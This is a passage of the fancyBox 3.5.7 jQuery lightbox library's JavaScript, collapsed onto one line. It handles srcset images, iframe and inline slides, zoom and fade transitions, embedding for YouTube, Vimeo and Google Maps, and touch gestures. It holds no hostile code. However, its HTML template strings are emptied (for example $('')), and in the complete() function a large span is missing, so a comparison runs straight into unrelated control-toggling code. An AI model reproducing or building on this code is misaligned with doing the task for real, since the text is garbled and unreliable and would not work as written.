.appendTo(slide.$content) .attr(\"src\", slide.thumb); } // Start loading actual image self.setBigImage(slide); }, // Check if image has srcset and get the source // ============================================ checkSrcset: function (slide) { var srcset = slide.opts.srcset || slide.opts.image.srcset, found, temp, pxRatio, windowWidth; // If we have \"srcset\", then we need to find first matching \"src\" value. // This is necessary, because when you set an src attribute, the browser will preload the image // before any javascript or even CSS is applied. if (srcset) { pxRatio = window.devicePixelRatio || 1; windowWidth = window.innerWidth * pxRatio; temp = srcset.split(\",\").map(function (el) { var ret = {}; el.trim() .split(/\\s+/) .forEach(function (el, i) { var value = parseInt(el.substring(0, el.length - 1), 10); if (i === 0) { return (ret.url = el); } if (value) { ret.value = value; ret.postfix = el[el.length - 1]; } }); return ret; }); // Sort by value temp.sort(function (a, b) { return a.value - b.value; }); // Ok, now we have an array of all srcset values for (var j = 0; j < temp.length; j++) { var el = temp[j]; if ((el.postfix === \"w\" && el.value >= windowWidth) || (el.postfix === \"x\" && el.value >= pxRatio)) { found = el; break; } } // If not found, take the last one if (!found && temp.length) { found = temp[temp.length - 1]; } if (found) { slide.src = found.url; // If we have default width/height values, we can calculate height for matching source if (slide.width && slide.height && found.postfix == \"w\") { slide.height = (slide.width / slide.height) * found.value; slide.width = found.value; } slide.opts.srcset = srcset; } } }, // Create full-size image // ====================== setBigImage: function (slide) { var self = this, img = document.createElement(\"img\"), $img = $(img); slide.$image = $img .one(\"error\", function () { self.setError(slide); }) .one(\"load\", function () { var sizes; if (!slide.$ghost) { self.resolveImageSlideSize(slide, this.naturalWidth, this.naturalHeight); self.afterLoad(slide); } if (self.isClosing) { return; } if (slide.opts.srcset) { sizes = slide.opts.sizes; if (!sizes || sizes === \"auto\") { sizes = (slide.width / slide.height > 1 && $W.width() / $W.height() > 1 ? \"100\" : Math.round((slide.width / slide.height) * 100)) + \"vw\"; } $img.attr(\"sizes\", sizes).attr(\"srcset\", slide.opts.srcset); } // Hide temporary image after some delay if (slide.$ghost) { setTimeout(function () { if (slide.$ghost && !self.isClosing) { slide.$ghost.hide(); } }, Math.min(300, Math.max(1000, slide.height / 1600))); } self.hideLoading(slide); }) .addClass(\"fancybox-image\") .attr(\"src\", slide.src) .appendTo(slide.$content); if ((img.complete || img.readyState == \"complete\") && $img.naturalWidth && $img.naturalHeight) { $img.trigger(\"load\"); } else if (img.error) { $img.trigger(\"error\"); } }, // Computes the slide size from image size and maxWidth/maxHeight // ============================================================== resolveImageSlideSize: function (slide, imgWidth, imgHeight) { var maxWidth = parseInt(slide.opts.width, 10), maxHeight = parseInt(slide.opts.height, 10); // Sets the default values from the image slide.width = imgWidth; slide.height = imgHeight; if (maxWidth > 0) { slide.width = maxWidth; slide.height = Math.floor((maxWidth * imgHeight) / imgWidth); } if (maxHeight > 0) { slide.width = Math.floor((maxHeight * imgWidth) / imgHeight); slide.height = maxHeight; } }, // Create iframe wrapper, iframe and bindings // ========================================== setIframe: function (slide) { var self = this, opts = slide.opts.iframe, $slide = slide.$slide, $iframe; slide.$content = $('') .css(opts.css) .appendTo($slide); $slide.addClass(\"fancybox-slide--\" + slide.contentType); slide.$iframe = $iframe = $(opts.tpl.replace(/\\{rnd\\}/g, new Date().getTime())) .attr(opts.attr) .appendTo(slide.$content); if (opts.preload) { self.showLoading(slide); // Unfortunately, it is not always possible to determine if iframe is successfully loaded // (due to browser security policy) $iframe.on(\"load.fb error.fb\", function (e) { this.isReady = 1; slide.$slide.trigger(\"refresh\"); self.afterLoad(slide); }); // Recalculate iframe content size // =============================== $slide.on(\"refresh.fb\", function () { var $content = slide.$content, frameWidth = opts.css.width, frameHeight = opts.css.height, $contents, $body; if ($iframe[0].isReady !== 1) { return; } try { $contents = $iframe.contents(); $body = $contents.find(\"body\"); } catch (ignore) {} // Calculate content dimensions, if it is accessible if ($body && $body.length && $body.children().length) { // Avoid scrolling to top (if multiple instances) $slide.css(\"overflow\", \"visible\"); $content.css({ width: \"100%\", \"max-width\": \"100%\", height: \"9999px\" }); if (frameWidth === undefined) { frameWidth = Math.ceil(Math.max($body[0].clientWidth, $body.outerWidth(true))); } $content.css(\"width\", frameWidth ? frameWidth : \"\").css(\"max-width\", \"\"); if (frameHeight === undefined) { frameHeight = Math.ceil(Math.max($body[0].clientHeight, $body.outerHeight(true))); } $content.css(\"height\", frameHeight ? frameHeight : \"\"); $slide.css(\"overflow\", \"auto\"); } $content.removeClass(\"fancybox-is-hidden\"); }); } else { self.afterLoad(slide); } $iframe.attr(\"src\", slide.src); // Remove iframe if closing or changing gallery item $slide.one(\"onReset\", function () { // This helps IE not to throw errors when closing try { $(this) .find(\"iframe\") .hide() .unbind() .attr(\"src\", \"//about:blank\"); } catch (ignore) {} $(this) .off(\"refresh.fb\") .empty(); slide.isLoaded = false; slide.isRevealed = false; }); }, // Wrap and append content to the slide // ====================================== setContent: function (slide, content) { var self = this; if (self.isClosing) { return; } self.hideLoading(slide); if (slide.$content) { $.fancybox.stop(slide.$content); } slide.$slide.empty(); // If content is a jQuery object, then it will be moved to the slide. // The placeholder is created so we will know where to put it back. if (isQuery(content) && content.parent().length) { // Make sure content is not already moved to fancyBox if (content.hasClass(\"fancybox-content\") || content.parent().hasClass(\"fancybox-content\")) { content.parents(\".fancybox-slide\").trigger(\"onReset\"); } // Create temporary element marking original place of the content slide.$placeholder = $(\"\") .hide() .insertAfter(content); // Make sure content is visible content.css(\"display\", \"inline-block\"); } else if (!slide.hasError) { // If content is just a plain text, try to convert it to html if ($.type(content) === \"string\") { content = $(\"\") .append($.trim(content)) .contents(); } // If \"filter\" option is provided, then filter content if (slide.opts.filter) { content = $(\"\") .html(content) .find(slide.opts.filter); } } slide.$slide.one(\"onReset\", function () { // Pause all html5 video/audio $(this) .find(\"video,audio\") .trigger(\"pause\"); // Put content back if (slide.$placeholder) { slide.$placeholder.after(content.removeClass(\"fancybox-content\").hide()).remove(); slide.$placeholder = null; } // Remove custom close button if (slide.$smallBtn) { slide.$smallBtn.remove(); slide.$smallBtn = null; } // Remove content and mark slide as not loaded if (!slide.hasError) { $(this).empty(); slide.isLoaded = false; slide.isRevealed = false; } }); $(content).appendTo(slide.$slide); if ($(content).is(\"video,audio\")) { $(content).addClass(\"fancybox-video\"); $(content).wrap(\"\"); slide.contentType = \"video\"; slide.opts.width = slide.opts.width || $(content).attr(\"width\"); slide.opts.height = slide.opts.height || $(content).attr(\"height\"); } slide.$content = slide.$slide .children() .filter(\"div,form,main,video,audio,article,.fancybox-content\") .first(); slide.$content.siblings().hide(); // Re-check if there is a valid content // (in some cases, ajax response can contain various elements or plain text) if (!slide.$content.length) { slide.$content = slide.$slide .wrapInner(\"\") .children() .first(); } slide.$content.addClass(\"fancybox-content\"); slide.$slide.addClass(\"fancybox-slide--\" + slide.contentType); self.afterLoad(slide); }, // Display error message // ===================== setError: function (slide) { slide.hasError = true; slide.$slide .trigger(\"onReset\") .removeClass(\"fancybox-slide--\" + slide.contentType) .addClass(\"fancybox-slide--error\"); slide.contentType = \"html\"; this.setContent(slide, this.translate(slide, slide.opts.errorTpl)); if (slide.pos === this.currPos) { this.isAnimating = false; } }, // Show loading icon inside the slide // ================================== showLoading: function (slide) { var self = this; slide = slide || self.current; if (slide && !slide.$spinner) { slide.$spinner = $(self.translate(self, self.opts.spinnerTpl)) .appendTo(slide.$slide) .hide() .fadeIn(\"fast\"); } }, // Remove loading icon from the slide // ================================== hideLoading: function (slide) { var self = this; slide = slide || self.current; if (slide && slide.$spinner) { slide.$spinner.stop().remove(); delete slide.$spinner; } }, // Adjustments after slide content has been loaded // =============================================== afterLoad: function (slide) { var self = this; if (self.isClosing) { return; } slide.isLoading = false; slide.isLoaded = true; self.trigger(\"afterLoad\", slide); self.hideLoading(slide); // Add small close button if (slide.opts.smallBtn && (!slide.$smallBtn || !slide.$smallBtn.length)) { slide.$smallBtn = $(self.translate(slide, slide.opts.btnTpl.smallBtn)).appendTo(slide.$content); } // Disable right click if (slide.opts.protect && slide.$content && !slide.hasError) { slide.$content.on(\"contextmenu.fb\", function (e) { if (e.button == 2) { e.preventDefault(); } return true; }); // Add fake element on top of the image // This makes a bit harder for user to select image if (slide.type === \"image\") { $('').appendTo(slide.$content); } } self.adjustCaption(slide); self.adjustLayout(slide); if (slide.pos === self.currPos) { self.updateCursor(); } self.revealContent(slide); }, // Prevent caption overlap, // fix css inconsistency across browsers // ===================================== adjustCaption: function (slide) { var self = this, current = slide || self.current, caption = current.opts.caption, preventOverlap = current.opts.preventCaptionOverlap, $caption = self.$refs.caption, $clone, captionH = false; $caption.toggleClass(\"fancybox-caption--separate\", preventOverlap); if (preventOverlap && caption && caption.length) { if (current.pos !== self.currPos) { $clone = $caption.clone().appendTo($caption.parent()); $clone .children() .eq(0) .empty() .html(caption); captionH = $clone.outerHeight(true); $clone.empty().remove(); } else if (self.$caption) { captionH = self.$caption.outerHeight(true); } current.$slide.css(\"padding-bottom\", captionH || \"\"); } }, // Simple hack to fix inconsistency across browsers, described here (affects Edge, too): // https://bugzilla.mozilla.org/show_bug.cgi?id=748518 // ==================================================================================== adjustLayout: function (slide) { var self = this, current = slide || self.current, scrollHeight, marginBottom, inlinePadding, actualPadding; if (current.isLoaded && current.opts.disableLayoutFix !== true) { current.$content.css(\"margin-bottom\", \"\"); // If we would always set margin-bottom for the content, // then it would potentially break vertical align if (current.$content.outerHeight() > current.$slide.height() + 0.5) { inlinePadding = current.$slide[0].style[\"padding-bottom\"]; actualPadding = current.$slide.css(\"padding-bottom\"); if (parseFloat(actualPadding) > 0) { scrollHeight = current.$slide[0].scrollHeight; current.$slide.css(\"padding-bottom\", 0); if (Math.abs(scrollHeight - current.$slide[0].scrollHeight) < 1) { marginBottom = actualPadding; } current.$slide.css(\"padding-bottom\", inlinePadding); } } current.$content.css(\"margin-bottom\", marginBottom); } }, // Make content visible // This method is called right after content has been loaded or // user navigates gallery and transition should start // ============================================================ revealContent: function (slide) { var self = this, $slide = slide.$slide, end = false, start = false, isMoved = self.isMoved(slide), isRevealed = slide.isRevealed, effect, effectClassName, duration, opacity; slide.isRevealed = true; effect = slide.opts[self.firstRun ? \"animationEffect\" : \"transitionEffect\"]; duration = slide.opts[self.firstRun ? \"animationDuration\" : \"transitionDuration\"]; duration = parseInt(slide.forcedDuration === undefined ? duration : slide.forcedDuration, 10); if (isMoved || slide.pos !== self.currPos || !duration) { effect = false; } // Check if can zoom if (effect === \"zoom\") { if (slide.pos === self.currPos && duration && slide.type === \"image\" && !slide.hasError && (start = self.getThumbPos(slide))) { end = self.getFitPos(slide); } else { effect = \"fade\"; } } // Zoom animation // ============== if (effect === \"zoom\") { self.isAnimating = true; end.scaleX = end.width / start.width; end.scaleY = end.height / start.height; // Check if we need to animate opacity opacity = slide.opts.zoomOpacity; if (opacity == \"auto\") { opacity = Math.abs(slide.width / slide.height - start.width / start.height) > 0.1; } if (opacity) { start.opacity = 0.1; end.opacity = 1; } // Draw image at start position $.fancybox.setTranslate(slide.$content.removeClass(\"fancybox-is-hidden\"), start); forceRedraw(slide.$content); // Start animation $.fancybox.animate(slide.$content, end, duration, function () { self.isAnimating = false; self.complete(); }); return; } self.updateSlide(slide); // Simply show content if no effect // ================================ if (!effect) { slide.$content.removeClass(\"fancybox-is-hidden\"); if (!isRevealed && isMoved && slide.type === \"image\" && !slide.hasError) { slide.$content.hide().fadeIn(\"fast\"); } if (slide.pos === self.currPos) { self.complete(); } return; } // Prepare for CSS transiton // ========================= $.fancybox.stop($slide); //effectClassName = \"fancybox-animated fancybox-slide--\" + (slide.pos >= self.prevPos ? \"next\" : \"previous\") + \" fancybox-fx-\" + effect; effectClassName = \"fancybox-slide--\" + (slide.pos >= self.prevPos ? \"next\" : \"previous\") + \" fancybox-animated fancybox-fx-\" + effect; $slide.addClass(effectClassName).removeClass(\"fancybox-slide--current\"); //.addClass(effectClassName); slide.$content.removeClass(\"fancybox-is-hidden\"); // Force reflow forceRedraw($slide); if (slide.type !== \"image\") { slide.$content.hide().show(0); } $.fancybox.animate( $slide, \"fancybox-slide--current\", duration, function () { $slide.removeClass(effectClassName).css({ transform: \"\", opacity: \"\" }); if (slide.pos === self.currPos) { self.complete(); } }, true ); }, // Check if we can and have to zoom from thumbnail //================================================ getThumbPos: function (slide) { var rez = false, $thumb = slide.$thumb, thumbPos, btw, brw, bbw, blw; if (!$thumb || !inViewport($thumb[0])) { return false; } thumbPos = $.fancybox.getTranslate($thumb); btw = parseFloat($thumb.css(\"border-top-width\") || 0); brw = parseFloat($thumb.css(\"border-right-width\") || 0); bbw = parseFloat($thumb.css(\"border-bottom-width\") || 0); blw = parseFloat($thumb.css(\"border-left-width\") || 0); rez = { top: thumbPos.top + btw, left: thumbPos.left + blw, width: thumbPos.width - brw - blw, height: thumbPos.height - btw - bbw, scaleX: 1, scaleY: 1 }; return thumbPos.width > 0 && thumbPos.height > 0 ? rez : false; }, // Final adjustments after current gallery item is moved to position // and it`s content is loaded // ================================================================== complete: function () { var self = this, current = self.current, slides = {}, $el; if (self.isMoved() || !current.isLoaded) { return; } if (!current.isComplete) { current.isComplete = true; current.$slide.siblings().trigger(\"onReset\"); self.preload(\"inline\"); // Trigger any CSS transiton inside the slide forceRedraw(current.$slide); current.$slide.addClass(\"fancybox-slide--complete\"); // Remove unnecessary slides $.each(self.slides, function (key, slide) { if (slide.pos >= self.currPos - 1 && slide.pos 1)) .toggleClass(\"fancybox-show-caption\", !!self.$caption) .toggleClass(\"fancybox-show-nav\", !!(opts.arrows && self.group.length > 1)) .toggleClass(\"fancybox-is-modal\", !!opts.modal); }, // Toggle toolbar and caption // ========================== toggleControls: function () { if (this.hasHiddenControls) { this.showControls(); } else { this.hideControls(); } } }); $.fancybox = { version: \"3.5.7\", defaults: defaults, // Get current instance and execute a command. // // Examples of usage: // // $instance = $.fancybox.getInstance(); // $.fancybox.getInstance().jumpTo( 1 ); // $.fancybox.getInstance( 'jumpTo', 1 ); // $.fancybox.getInstance( function() { // console.info( this.currIndex ); // }); // ====================================================== getInstance: function (command) { var instance = $('.fancybox-container:not(\".fancybox-is-closing\"):last').data(\"FancyBox\"), args = Array.prototype.slice.call(arguments, 1); if (instance instanceof FancyBox) { if ($.type(command) === \"string\") { instance[command].apply(instance, args); } else if ($.type(command) === \"function\") { command.apply(instance, args); } return instance; } return false; }, // Create new instance // =================== open: function (items, opts, index) { return new FancyBox(items, opts, index); }, // Close current or all instances // ============================== close: function (all) { var instance = this.getInstance(); if (instance) { instance.close(); // Try to find and close next instance if (all === true) { this.close(all); } } }, // Close all instances and unbind all events // ========================================= destroy: function () { this.close(true); $D.add(\"body\").off(\"click.fb-start\", \"**\"); }, // Try to detect mobile devices // ============================ isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent), // Detect if 'translate3d' support is available // ============================================ use3d: (function () { var div = document.createElement(\"div\"); return ( window.getComputedStyle && window.getComputedStyle(div) && window.getComputedStyle(div).getPropertyValue(\"transform\") && !(document.documentMode && document.documentMode < 11) ); })(), // Helper function to get current visual state of an element // returns array[ top, left, horizontal-scale, vertical-scale, opacity ] // ===================================================================== getTranslate: function ($el) { var domRect; if (!$el || !$el.length) { return false; } domRect = $el[0].getBoundingClientRect(); return { top: domRect.top || 0, left: domRect.left || 0, width: domRect.width, height: domRect.height, opacity: parseFloat($el.css(\"opacity\")) }; }, // Shortcut for setting \"translate3d\" properties for element // Can set be used to set opacity, too // ======================================================== setTranslate: function ($el, props) { var str = \"\", css = {}; if (!$el || !props) { return; } if (props.left !== undefined || props.top !== undefined) { str = (props.left === undefined ? $el.position().left : props.left) + \"px, \" + (props.top === undefined ? $el.position().top : props.top) + \"px\"; if (this.use3d) { str = \"translate3d(\" + str + \", 0px)\"; } else { str = \"translate(\" + str + \")\"; } } if (props.scaleX !== undefined && props.scaleY !== undefined) { str += \" scale(\" + props.scaleX + \", \" + props.scaleY + \")\"; } else if (props.scaleX !== undefined) { str += \" scaleX(\" + props.scaleX + \")\"; } if (str.length) { css.transform = str; } if (props.opacity !== undefined) { css.opacity = props.opacity; } if (props.width !== undefined) { css.width = props.width; } if (props.height !== undefined) { css.height = props.height; } return $el.css(css); }, // Simple CSS transition handler // ============================= animate: function ($el, to, duration, callback, leaveAnimationName) { var self = this, from; if ($.isFunction(duration)) { callback = duration; duration = null; } self.stop($el); from = self.getTranslate($el); $el.on(transitionEnd, function (e) { // Skip events from child elements and z-index change if (e && e.originalEvent && (!$el.is(e.originalEvent.target) || e.originalEvent.propertyName == \"z-index\")) { return; } self.stop($el); if ($.isNumeric(duration)) { $el.css(\"transition-duration\", \"\"); } if ($.isPlainObject(to)) { if (to.scaleX !== undefined && to.scaleY !== undefined) { self.setTranslate($el, { top: to.top, left: to.left, width: from.width * to.scaleX, height: from.height * to.scaleY, scaleX: 1, scaleY: 1 }); } } else if (leaveAnimationName !== true) { $el.removeClass(to); } if ($.isFunction(callback)) { callback(e); } }); if ($.isNumeric(duration)) { $el.css(\"transition-duration\", duration + \"ms\"); } // Start animation by changing CSS properties or class name if ($.isPlainObject(to)) { if (to.scaleX !== undefined && to.scaleY !== undefined) { delete to.width; delete to.height; if ($el.parent().hasClass(\"fancybox-slide--image\")) { $el.parent().addClass(\"fancybox-is-scaling\"); } } $.fancybox.setTranslate($el, to); } else { $el.addClass(to); } // Make sure that `transitionend` callback gets fired $el.data( \"timer\", setTimeout(function () { $el.trigger(transitionEnd); }, duration + 33) ); }, stop: function ($el, callCallback) { if ($el && $el.length) { clearTimeout($el.data(\"timer\")); if (callCallback) { $el.trigger(transitionEnd); } $el.off(transitionEnd).css(\"transition-duration\", \"\"); $el.parent().removeClass(\"fancybox-is-scaling\"); } } }; // Default click handler for \"fancyboxed\" links // ============================================ function _run(e, opts) { var items = [], index = 0, $target, value, instance; // Avoid opening multiple times if (e && e.isDefaultPrevented()) { return; } e.preventDefault(); opts = opts || {}; if (e && e.data) { opts = mergeOpts(e.data.options, opts); } $target = opts.$target || $(e.currentTarget).trigger(\"blur\"); instance = $.fancybox.getInstance(); if (instance && instance.$trigger && instance.$trigger.is($target)) { return; } if (opts.selector) { items = $(opts.selector); } else { // Get all related items and find index for clicked one value = $target.attr(\"data-fancybox\") || \"\"; if (value) { items = e.data ? e.data.items : []; items = items.length ? items.filter('[data-fancybox=\"' + value + '\"]') : $('[data-fancybox=\"' + value + '\"]'); } else { items = [$target]; } } index = $(items).index($target); // Sometimes current item can not be found if (index < 0) { index = 0; } instance = $.fancybox.open(items, opts, index); // Save last active element instance.$trigger = $target; } // Create a jQuery plugin // ====================== $.fn.fancybox = function (options) { var selector; options = options || {}; selector = options.selector || false; if (selector) { // Use body element instead of document so it executes first $(\"body\") .off(\"click.fb-start\", selector) .on(\"click.fb-start\", selector, { options: options }, _run); } else { this.off(\"click.fb-start\").on( \"click.fb-start\", { items: this, options: options }, _run ); } return this; }; // Self initializing plugin for all elements having `data-fancybox` attribute // ========================================================================== $D.on(\"click.fb-start\", \"[data-fancybox]\", _run); // Enable \"trigger elements\" // ========================= $D.on(\"click.fb-start\", \"[data-fancybox-trigger]\", function (e) { $('[data-fancybox=\"' + $(this).attr(\"data-fancybox-trigger\") + '\"]') .eq($(this).attr(\"data-fancybox-index\") || 0) .trigger(\"click.fb-start\", { $trigger: $(this) }); }); // Track focus event for better accessibility styling // ================================================== (function () { var buttonStr = \".fancybox-button\", focusStr = \"fancybox-focus\", $pressed = null; $D.on(\"mousedown mouseup focus blur\", buttonStr, function (e) { switch (e.type) { case \"mousedown\": $pressed = $(this); break; case \"mouseup\": $pressed = null; break; case \"focusin\": $(buttonStr).removeClass(focusStr); if (!$(this).is($pressed) && !$(this).is(\"[disabled]\")) { $(this).addClass(focusStr); } break; case \"focusout\": $(buttonStr).removeClass(focusStr); break; } }); })(); })(window, document, jQuery); // ========================================================================== // // Media // Adds additional media type support // // ========================================================================== (function ($) { \"use strict\"; // Object containing properties for each media type var defaults = { youtube: { matcher: /(youtube\\.com|youtu\\.be|youtube\\-nocookie\\.com)\\/(watch\\?(.*&)?v=|v\\/|u\\/|embed\\/?)?(videoseries\\?list=(.*)|[\\w-]{11}|\\?listType=(.*)&list=(.*))(.*)/i, params: { autoplay: 1, autohide: 1, fs: 1, rel: 0, hd: 1, wmode: \"transparent\", enablejsapi: 1, html5: 1 }, paramPlace: 8, type: \"iframe\", url: \"https://www.youtube-nocookie.com/embed/$4\", thumb: \"https://img.youtube.com/vi/$4/hqdefault.jpg\" }, vimeo: { matcher: /^.+vimeo.com\\/(.*\\/)?([\\d]+)(.*)?/, params: { autoplay: 1, hd: 1, show_title: 1, show_byline: 1, show_portrait: 0, fullscreen: 1 }, paramPlace: 3, type: \"iframe\", url: \"//player.vimeo.com/video/$2\" }, instagram: { matcher: /(instagr\\.am|instagram\\.com)\\/p\\/([a-zA-Z0-9_\\-]+)\\/?/i, type: \"image\", url: \"//$1/p/$2/media/?size=l\" }, // Examples: // http://maps.google.com/?ll=48.857995,2.294297&spn=0.007666,0.021136&t=m&z=16 // https://www.google.com/maps/@37.7852006,-122.4146355,14.65z // https://www.google.com/maps/@52.2111123,2.9237542,6.61z?hl=en // https://www.google.com/maps/place/Googleplex/@37.4220041,-122.0833494,17z/data=!4m5!3m4!1s0x0:0x6c296c66619367e0!8m2!3d37.4219998!4d-122.0840572 gmap_place: { matcher: /(maps\\.)?google\\.([a-z]{2,3}(\\.[a-z]{2})?)\\/(((maps\\/(place\\/(.*)\\/)?\\@(.*),(\\d+.?\\d+?)z))|(\\?ll=))(.*)?/i, type: \"iframe\", url: function (rez) { return ( \"//maps.google.\" + rez[2] + \"/?ll=\" + (rez[9] ? rez[9] + \"&z=\" + Math.floor(rez[10]) + (rez[12] ? rez[12].replace(/^\\//, \"&\") : \"\") : rez[12] + \"\").replace(/\\?/, \"&\") + \"&output=\" + (rez[12] && rez[12].indexOf(\"layer=c\") > 0 ? \"svembed\" : \"embed\") ); } }, // Examples: // https://www.google.com/maps/search/Empire+State+Building/ // https://www.google.com/maps/search/?api=1&query=centurylink+field // https://www.google.com/maps/search/?api=1&query=47.5951518,-122.3316393 gmap_search: { matcher: /(maps\\.)?google\\.([a-z]{2,3}(\\.[a-z]{2})?)\\/(maps\\/search\\/)(.*)/i, type: \"iframe\", url: function (rez) { return \"//maps.google.\" + rez[2] + \"/maps?q=\" + rez[5].replace(\"query=\", \"q=\").replace(\"api=1\", \"\") + \"&output=embed\"; } } }; // Formats matching url to final form var format = function (url, rez, params) { if (!url) { return; } params = params || \"\"; if ($.type(params) === \"object\") { params = $.param(params, true); } $.each(rez, function (key, value) { url = url.replace(\"$\" + key, value || \"\"); }); if (params.length) { url += (url.indexOf(\"?\") > 0 ? \"&\" : \"?\") + params; } return url; }; $(document).on(\"objectNeedsType.fb\", function (e, instance, item) { var url = item.src || \"\", type = false, media, thumb, rez, params, urlParams, paramObj, provider; media = $.extend(true, {}, defaults, item.opts.media); // Look for any matching media type $.each(media, function (providerName, providerOpts) { rez = url.match(providerOpts.matcher); if (!rez) { return; } type = providerOpts.type; provider = providerName; paramObj = {}; if (providerOpts.paramPlace && rez[providerOpts.paramPlace]) { urlParams = rez[providerOpts.paramPlace]; if (urlParams[0] == \"?\") { urlParams = urlParams.substring(1); } urlParams = urlParams.split(\"&\"); for (var m = 0; m < urlParams.length; ++m) { var p = urlParams[m].split(\"=\", 2); if (p.length == 2) { paramObj[p[0]] = decodeURIComponent(p[1].replace(/\\+/g, \" \")); } } } params = $.extend(true, {}, providerOpts.params, item.opts[providerName], paramObj); url = $.type(providerOpts.url) === \"function\" ? providerOpts.url.call(this, rez, params, item) : format(providerOpts.url, rez, params); thumb = $.type(providerOpts.thumb) === \"function\" ? providerOpts.thumb.call(this, rez, params, item) : format(providerOpts.thumb, rez); if (providerName === \"youtube\") { url = url.replace(/&t=((\\d+)m)?(\\d+)s/, function (match, p1, m, s) { return \"&start=\" + ((m ? parseInt(m, 10) * 60 : 0) + parseInt(s, 10)); }); } else if (providerName === \"vimeo\") { url = url.replace(\"&%23\", \"#\"); } return false; }); // If it is found, then change content type and update the url if (type) { if (!item.opts.thumb && !(item.opts.$thumb && item.opts.$thumb.length)) { item.opts.thumb = thumb; } if (type === \"iframe\") { item.opts = $.extend(true, item.opts, { iframe: { preload: false, attr: { scrolling: \"no\" } } }); } $.extend(item, { type: type, src: url, origSrc: item.src, contentSource: provider, contentType: type === \"image\" ? \"image\" : provider == \"gmap_place\" || provider == \"gmap_search\" ? \"map\" : \"video\" }); } else if (url) { item.type = item.opts.defaultType; } }); // Load YouTube/Video API on request to detect when video finished playing var VideoAPILoader = { youtube: { src: \"https://www.youtube.com/iframe_api\", class: \"YT\", loading: false, loaded: false }, vimeo: { src: \"https://player.vimeo.com/api/player.js\", class: \"Vimeo\", loading: false, loaded: false }, load: function (vendor) { var _this = this, script; if (this[vendor].loaded) { setTimeout(function () { _this.done(vendor); }); return; } if (this[vendor].loading) { return; } this[vendor].loading = true; script = document.createElement(\"script\"); script.type = \"text/javascript\"; script.src = this[vendor].src; if (vendor === \"youtube\") { window.onYouTubeIframeAPIReady = function () { _this[vendor].loaded = true; _this.done(vendor); }; } else { script.onload = function () { _this[vendor].loaded = true; _this.done(vendor); }; } document.body.appendChild(script); }, done: function (vendor) { var instance, $el, player; if (vendor === \"youtube\") { delete window.onYouTubeIframeAPIReady; } instance = $.fancybox.getInstance(); if (instance) { $el = instance.current.$content.find(\"iframe\"); if (vendor === \"youtube\" && YT !== undefined && YT) { player = new YT.Player($el.attr(\"id\"), { events: { onStateChange: function (e) { if (e.data == 0) { instance.next(); } } } }); } else if (vendor === \"vimeo\" && Vimeo !== undefined && Vimeo) { player = new Vimeo.Player($el); player.on(\"ended\", function () { instance.next(); }); } } } }; $(document).on({ \"afterShow.fb\": function (e, instance, current) { if (instance.group.length > 1 && (current.contentSource === \"youtube\" || current.contentSource === \"vimeo\")) { VideoAPILoader.load(current.contentSource); } } }); })(jQuery); // ========================================================================== // // Guestures // Adds touch guestures, handles click and tap events // // ========================================================================== (function (window, document, $) { \"use strict\"; var requestAFrame = (function () { return ( window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || // if all else fails, use setTimeout function (callback) { return window.setTimeout(callback, 1000 / 60); } ); })(); var cancelAFrame = (function () { return ( window.cancelAnimationFrame || window.webkitCancelAnimationFrame || window.mozCancelAnimationFrame || window.oCancelAnimationFrame || function (id) { window.clearTimeout(id); } ); })(); var getPointerXY = function (e) { var result = []; e = e.originalEvent || e || window.e; e = e.touches && e.touches.length ? e.touches : e.changedTouches && e.changedTouches.length ? e.changedTouches : [e]; for (var key in e) { if (e[key].pageX) { result.push({ x: e[key].pageX, y: e[key].pageY }); } else if (e[key].clientX) { result.push({ x: e[key].clientX, y: e[key].clientY }); } } return result; }; var distance = function (point2, point1, what) { if (!point1 || !point2) { return 0; } if (what === \"x\") { return point2.x - point1.x; } else if (what === \"y\") { return point2.y - point1.y; } return Math.sqrt(Math.pow(point2.x - point1.x, 2) + Math.pow(point2.y - point1.y, 2)); }; var isClickable = function ($el) { if ( $el.is('a,area,button,[role=\"button\"],input,label,select,summary,textarea,video,audio,iframe') || $.isFunction($el.get(0).onclick) || $el.data(\"selectable\") ) { return true; } // Check for attributes like data-fancybox-next or data-fancybox-close for (var i = 0, atts = $el[0].attributes, n = atts.length; i < n; i++) { if (atts[i].nodeName.substr(0, 14) === \"data-fancybox-\") { return true; } } return false; }; var hasScrollbars = function (el) { var overflowY = window.getComputedStyle(el)[\"overflow-y\"], overflowX = window.getComputedStyle(el)[\"overflow-x\"], vertical = (overflowY === \"scroll\" || overflowY === \"auto\") && el.scrollHeight > el.clientHeight, horizontal = (overflowX === \"scroll\" || overflowX === \"auto\") && el.scrollWidth > el.clientWidth; return vertical || horizontal; }; var isScrollable = function ($el) { var rez = false; while (true) { rez = hasScrollbars($el.get(0)); if (rez) { break; } $el = $el.parent(); if (!$el.length || $el.hasClass(\"fancybox-stage\") || $el.is(\"body\")) { break; } } return rez; }; var Guestures = function (instance) { var self = this; self.instance = instance; self.$bg = instance.$refs.bg; self.$stage = instance.$refs.stage; self.$container = instance.$refs.container; self.destroy(); self.$container.on(\"touchstart.fb.touch mousedown.fb.touch\", $.proxy(self, \"ontouchstart\")); }; Guestures.prototype.destroy = function () { var self = this; self.$container.off(\".fb.touch\"); $(document).off(\".fb.touch\"); if (self.requestId) { cancelAFrame(self.requestId); self.requestId = null; } if (self.tapped) { clearTimeout(self.tapped); self.tapped = null; } }; Guestures.prototype.ontouchstart = function (e) { var self = this, $target = $(e.target), instance = self.instance, current = instance.current, $slide = current.$slide, $content = current.$content, isTouchDevice = e.type == \"touchstart\"; // Do not respond to both (touch and mouse) events if (isTouchDevice) { self.$container.off(\"mousedown.fb.touch\"); } // Ignore right click if (e.originalEvent && e.originalEvent.button == 2) { return; } // Ignore taping on links, buttons, input elements if (!$slide.length || !$target.length || isClickable($target) || isClickable($target.parent())) { return; } // Ignore clicks on the scrollbar if (!$target.is(\"img\") && e.originalEvent.clientX > $target[0].clientWidth + $target.offset().left) { return; } // Ignore clicks while zooming or closing if (!current || instance.isAnimating || current.$slide.hasClass(\"fancybox-animated\")) { e.stopPropagation(); e.preventDefault(); return; } self.realPoints = self.startPoints = getPointerXY(e); if (!self.startPoints.length) { return; } // Allow other scripts to catch touch event if \"touch\" is set to false if (current.touch) { e.stopPropagation(); } self.startEvent = e; self.canTap = true; self.$target = $target; self.$content = $content; self.opts = current.opts.touch; self.isPanning = false; self.isSwiping = false; self.isZooming = false; self.isScrolling = false; self.canPan = instance.canPan(); self.startTime = new Date().getTime(); self.distanceX = self.distanceY = self.distance = 0; self.canvasWidth = 